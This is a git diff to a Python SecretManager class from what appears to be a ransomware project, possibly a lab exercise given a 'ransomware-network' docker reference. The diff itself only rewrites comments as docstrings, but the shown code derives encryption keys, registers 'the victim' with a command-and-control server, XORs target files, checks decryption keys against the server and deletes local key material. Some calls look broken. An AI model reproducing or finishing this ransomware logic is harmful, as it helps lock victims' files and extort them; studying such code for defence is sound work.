@@ -28,12 +28,13 @@ class SecretManager:
         self._log = logging.getLogger(self.__class__.__name__)
 
     def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        
-        # here we want to hash the salt and the key thanks to the function PBKDF2HMAC
-        # First we hash the salt
-        # we use the "token_bytes" function from the secret class which generate a random bytes string with the 
-        # number of bytes we want
-        
+        """
+         Function to do the key and the salt derivation
+        """
+
+        # First, salt derivation
+        # Use of the "token_bytes" function from the secret class 
+        # which generate a random bytes string 
         salt_derivate = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=self.SALT_LENGTH,
@@ -43,7 +44,7 @@ class SecretManager:
 
         new_salt = salt_derivate.derive(salt)
     
-        #Then we hash the key with the new_salt 
+        #Then, key derivation with the previous salt derivation 
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=self.TOKEN_LENGTH,
@@ -57,8 +58,11 @@ class SecretManager:
 
 
     def create(self)->Tuple[bytes, bytes, bytes]:
-        # This function create a tuple compose of a random key, a random salt, and the token
-        # To generate a random key and salt we use the "token_bytes" function
+        """
+         Create a tuple compose of a random key, a random salt, and the token
+        """
+        # Use of the 'token_bytes' function in order to generate 
+        # a random key and salt 
 
         self._token = secrets.token_bytes(16)
         response = {
@@ -74,7 +78,9 @@ class SecretManager:
         return str(tmp, "utf8")
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
+        """
+         Register the victim to the CNC
+        """
         # Json format does not support bytes so we use the "bin_to_64" method
         
         payload = {
@@ -89,8 +95,10 @@ class SecretManager:
         # 'sudo docker inspect ransomware-network'
 
     def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        
+        """ 
+         Main function to create crypto data and register malware to cnc
+        """
+
         tokens = self.create()
         self._key, self._salt = self.do_derivation(tokens["salt"],tokens["key"])
         self._token = tokens["token"]
@@ -110,7 +118,10 @@ class SecretManager:
         
 
     def load(self)->None:
-        # function to load crypto data
+        """
+         Function to load crypto data
+        """
+
         folder_name = "/root/tokens"
         with open(folder_name + "/salt.bin", "rb") as file:
             self._salt = file.read()
@@ -119,7 +130,9 @@ class SecretManager:
             self._token = file.read()
 
     def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
+        """
+         Assert the key is valid
+        """
         
         token = self.get_hex_token()
         payload = {
@@ -136,7 +149,10 @@ class SecretManager:
             return False
 
     def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
+        """
+         If the key is valid, set the self._key var for decrypting
+        """
+
         key = base64.decode(b64_key)
         check_error_key = self.check_key(key)
         if check_error_key == True:
@@ -146,7 +162,10 @@ class SecretManager:
         return
 
     def get_hex_token(self)->str:
-        # Return a string composed of hex symbole, regarding the token
+        """
+         Return a string composed of hex symbole, regarding the token
+        """
+
         hex_token = ""
         with open('/root/tokens/token.bin', 'rb') as file:
             hex_token = file.read()
@@ -155,7 +174,10 @@ class SecretManager:
         return hex_token
 
     def xorfiles(self, files:List[str])->None :
-        # xor a list for file
+        """
+         XOR a list for file
+        """
+
         files_encrypted = {}
         for file in files:
             files_encrypted[str(file)] = xorfile(file, self._key)
@@ -166,7 +188,10 @@ class SecretManager:
         raise NotImplemented()
 
     def clean(self):
-        # remove crypto data from the target
+        """
+         Remove crypto data from the target
+        """
+
         folder_name = "/root/tokens"
         os.remove(folder_name+"/salt.bin")
         os.remove(folder_name + '/token.bin')
